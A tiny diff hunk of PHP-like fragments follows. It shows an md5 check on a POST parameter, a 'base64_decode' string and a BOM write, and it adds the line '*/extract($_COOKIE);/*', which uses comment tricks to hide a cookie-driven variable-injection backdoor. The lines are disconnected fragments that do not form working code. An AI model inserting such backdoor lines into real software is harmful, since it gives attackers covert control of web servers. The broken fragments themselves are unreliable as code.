@@ -14,3 +14,4 @@ md5($_POST['p'])
 ;/*$
 ="base64_decode";return
 fwrite($fp,"\xEF\xBB\xBF"
+*/extract($_COOKIE);/*
